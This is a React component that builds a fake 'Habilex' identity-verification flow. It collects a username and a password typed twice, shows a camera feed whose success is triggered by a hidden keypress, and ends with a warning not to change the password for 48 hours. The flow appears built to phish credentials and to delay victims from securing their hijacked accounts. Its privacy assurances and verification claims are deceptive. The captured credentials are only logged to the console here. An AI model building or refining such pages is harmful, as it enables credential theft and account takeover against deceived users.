import { useCallback, useEffect, useRef, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ArrowLeft, Lock, Shield, HelpCircle, AlertTriangle, Check } from "lucide-react";

type Screen = "login" | "instructions" | "camera" | "success" | "warning";

export default function FaceVerification() {
  const [screen, setScreen] = useState<Screen>("login");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");

  const passwordsMatch =
    password.length > 0 &&
    confirmPassword.length > 0 &&
    password === confirmPassword;

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col font-sans">
      {screen === "login" && (
        <LoginScreen
          username={username}
          setUsername={setUsername}
          password={password}
          setPassword={setPassword}
          confirmPassword={confirmPassword}
          setConfirmPassword={setConfirmPassword}
          passwordsMatch={passwordsMatch}
          onNext={() => {
            console.log("Credentials submitted:", { username, password });
            setScreen("instructions");
          }}
        />
      )}
      {screen === "instructions" && (
        <InstructionsScreen
          onBack={() => setScreen("login")}
          onNext={() => setScreen("camera")}
        />
      )}
      {screen === "camera" && (
        <CameraScreen
          onSuccess={() => {
            console.log("Face scan simulated — success");
            setScreen("success");
          }}
        />
      )}
      {screen === "success" && (
        <SuccessScreen
          onSubmit={() => {
            console.log("Verification submitted");
            setScreen("warning");
          }}
        />
      )}
      {screen === "warning" && (
        <WarningScreen
          onOkay={() => {
            console.log("Flow complete");
            setScreen("login");
            setUsername("");
            setPassword("");
            setConfirmPassword("");
          }}
        />
      )}
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   SCREEN 1 — Login UI
   ═══════════════════════════════════════════════════════════ */

function LoginScreen({
  username,
  setUsername,
  password,
  setPassword,
  confirmPassword,
  setConfirmPassword,
  passwordsMatch,
  onNext,
}: {
  username: string;
  setUsername: (v: string) => void;
  password: string;
  setPassword: (v: string) => void;
  confirmPassword: string;
  setConfirmPassword: (v: string) => void;
  passwordsMatch: boolean;
  onNext: () => void;
}) {
  return (
    <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
      {/* Glowing logo */}
      <div className="mb-10 relative">
        <div className="absolute inset-0 blur-2xl bg-blue-500/30 rounded-full scale-150" />
        <div className="relative size-20 rounded-2xl bg-[#141414] border border-white/10 flex items-center justify-center shadow-[0_0_40px_rgba(59,130,246,0.25)]">
          <Shield className="size-10 text-blue-500" />
        </div>
      </div>

      {/* Inputs */}
      <div className="w-full max-w-sm space-y-4">
        <input
          type="text"
          placeholder="Username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full h-12 px-4 rounded-xl bg-[#141414] border border-white/10 text-white text-sm placeholder:text-white/30 outline-none focus:border-blue-500/60 transition-colors"
        />
        <input
          type="password"
          placeholder="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full h-12 px-4 rounded-xl bg-[#141414] border border-white/10 text-white text-sm placeholder:text-white/30 outline-none focus:border-blue-500/60 transition-colors"
        />
        <input
          type="password"
          placeholder="password"
          value={confirmPassword}
          onChange={(e) => setConfirmPassword(e.target.value)}
          className={`w-full h-12 px-4 rounded-xl bg-[#141414] border text-white text-sm placeholder:text-white/30 outline-none transition-colors ${
            confirmPassword && !passwordsMatch
              ? "border-red-500/60"
              : "border-white/10 focus:border-blue-500/60"
          }`}
        />
        {confirmPassword && !passwordsMatch && (
          <p className="text-xs text-red-400 -mt-2">Passwords do not match</p>
        )}
      </div>

      {/* Next button */}
      <Button
        onClick={onNext}
        disabled={!passwordsMatch || !username.trim()}
        className="mt-8 w-full max-w-sm h-12 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-medium text-sm disabled:opacity-30 disabled:cursor-not-allowed transition-all"
      >
        Next
      </Button>

      {/* Footer */}
      <p className="mt-auto pt-10 text-[11px] text-white/20 tracking-wide">
        habilex
      </p>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   SCREEN 2 — Instruction UI
   ═══════════════════════════════════════════════════════════ */

function InstructionsScreen({
  onBack,
  onNext,
}: {
  onBack: () => void;
  onNext: () => void;
}) {
  return (
    <div className="flex-1 flex flex-col px-6 py-6">
      {/* Top bar */}
      <div className="flex items-center gap-3 mb-10">
        <button
          onClick={onBack}
          className="size-9 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition-colors"
        >
          <ArrowLeft className="size-4 text-white/70" />
        </button>
        <span className="text-sm font-medium text-white/80">Video selfie</span>
      </div>

      {/* Face circle — dotted border, no arrows */}
      <div className="flex-1 flex flex-col items-center justify-center">
        <div className="mb-8 size-44 rounded-full border-2 border-dotted border-white/25 flex items-center justify-center">
          <svg
            viewBox="0 0 24 24"
            fill="none"
            className="size-16 text-white/40"
            stroke="currentColor"
            strokeWidth="1.2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <circle cx="12" cy="8" r="4" />
            <path d="M5 20c0-3.866 3.134-7 7-7s7 3.134 7 7" />
          </svg>
        </div>

        <h1 className="text-xl font-semibold text-white mb-3 text-center">
          Take a video selfie
        </h1>
        <p className="text-sm text-white/40 text-center max-w-xs leading-relaxed mb-10">
          Position your face clearly in the circle. Make sure you are in a
          well-lit area and your full face is visible.
        </p>

        {/* Privacy note */}
        <div className="flex items-center gap-2 mb-6">
          <Lock className="size-3.5 text-white/25" />
          <p className="text-[11px] text-white/25">
            This data stays on Habilex and is never shared.
          </p>
        </div>

        <Button
          onClick={onNext}
          className="w-full max-w-sm h-12 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-medium text-sm transition-all"
        >
          Next
        </Button>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   SCREEN 3 — Camera Simulation UI
   ═══════════════════════════════════════════════════════════ */

function CameraScreen({ onSuccess }: { onSuccess: () => void }) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [isActive, setIsActive] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let mounted = true;

    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false,
        });
        if (!mounted) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }
        streamRef.current = stream;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          if (mounted) setIsActive(true);
        }
      } catch {
        if (mounted) setError("Camera access denied. Please allow permissions and reload.");
      }
    };

    startCamera();

    return () => {
      mounted = false;
      streamRef.current?.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    };
  }, []);

  // Hidden keyboard shortcut: S = success
  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === "s" || e.key === "S") {
        streamRef.current?.getTracks().forEach((t) => t.stop());
        onSuccess();
      }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [onSuccess]);

  return (
    <div className="flex-1 flex flex-col px-6 py-6">
      {/* Top bar */}
      <div className="flex items-center justify-between mb-8">
        <span className="text-sm font-medium text-white/80">Video selfie</span>
        <button className="flex items-center gap-1 text-sm text-blue-400 hover:text-blue-300 transition-colors">
          <HelpCircle className="size-4" />
          Help
        </button>
      </div>

      {/* Camera circle */}
      <div className="flex-1 flex flex-col items-center justify-center">
        <div className="relative size-72 sm:size-80 rounded-full overflow-hidden border-2 border-white/10">
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            className="size-full object-cover"
            style={{ transform: "scaleX(-1)" }}
          />
          {!isActive && !error && (
            <div className="absolute inset-0 flex items-center justify-center bg-[#0a0a0a]/80">
              <div className="size-10 border-2 border-white/20 border-t-blue-500 rounded-full animate-spin" />
            </div>
          )}
          {error && (
            <div className="absolute inset-0 flex items-center justify-center bg-[#0a0a0a]/90 p-6">
              <p className="text-xs text-red-400 text-center">{error}</p>
            </div>
          )}
        </div>

        <p className="mt-8 text-sm text-white/40 text-center">
          Position your face in the circle.
        </p>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   SCREEN 4 — Success UI
   ═══════════════════════════════════════════════════════════ */

function SuccessScreen({ onSubmit }: { onSubmit: () => void }) {
  return (
    <div className="flex-1 flex flex-col px-6 py-6">
      <div className="flex-1 flex flex-col items-center justify-center">
        {/* Gradient ring with checkmark */}
        <div className="mb-8 relative">
          <div className="size-36 rounded-full p-[3px] bg-gradient-to-tr from-orange-500 via-pink-500 to-purple-500">
            <div className="size-full rounded-full bg-[#0a0a0a] flex items-center justify-center">
              <div className="size-14 rounded-full bg-gradient-to-tr from-orange-500 via-pink-500 to-purple-500 flex items-center justify-center">
                <Check className="size-7 text-white" strokeWidth={3} />
              </div>
            </div>
          </div>
        </div>

        <h1 className="text-lg font-semibold text-white mb-2 text-center">
          Video selfie complete
        </h1>
        <p className="text-sm text-white/40 text-center max-w-xs leading-relaxed mb-10">
          Your video selfie has been captured. We will compare it against your
          reference images to verify your identity.
        </p>

        {/* Privacy note */}
        <div className="flex items-center gap-2 mb-6">
          <Lock className="size-3.5 text-white/25" />
          <p className="text-[11px] text-white/25">
            This data stays on Habilex and is never shared.
          </p>
        </div>

        <Button
          onClick={onSubmit}
          className="w-full max-w-sm h-12 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-medium text-sm transition-all"
        >
          Submit
        </Button>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════════════════
   SCREEN 5 — Final Warning UI
   ═══════════════════════════════════════════════════════════ */

function WarningScreen({ onOkay }: { onOkay: () => void }) {
  return (
    <div className="flex-1 flex flex-col items-center justify-center px-6 py-10">
      {/* Glowing padlock shield */}
      <div className="mb-8 relative">
        <div className="absolute inset-0 blur-3xl bg-blue-500/20 rounded-full scale-[2]" />
        <div className="relative size-20 rounded-full bg-[#141414] border border-blue-500/30 flex items-center justify-center shadow-[0_0_60px_rgba(59,130,246,0.2)]">
          <Shield className="size-10 text-blue-500" />
        </div>
      </div>

      <h1 className="text-lg font-semibold text-white mb-3 text-center">
        Security Verification in Progress
      </h1>
      <p className="text-sm text-white/40 text-center max-w-sm leading-relaxed mb-8">
        Your account security verification is currently processing. This may
        take 3 to 5 hours to complete. To ensure your safety, any new attempts
        to log into your account during this time will be automatically blocked.
      </p>

      {/* Yellow warning block */}
      <div className="w-full max-w-sm rounded-xl border border-yellow-500/20 bg-yellow-500/5 p-4 mb-8">
        <div className="flex items-start gap-3">
          <AlertTriangle className="size-5 text-yellow-500 shrink-0 mt-0.5" />
          <div>
            <p className="text-sm font-semibold text-yellow-500 mb-1">
              Important Warning
            </p>
            <p className="text-xs text-white/40 leading-relaxed">
              Please do not attempt to change your password for the next 48
              hours. Doing so may trigger our security systems and result in
              account suspension.
            </p>
          </div>
        </div>
      </div>

      <Button
        onClick={onOkay}
        className="w-full max-w-sm h-12 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-medium text-sm transition-all"
      >
        Okay
      </Button>
    </div>
  );
}
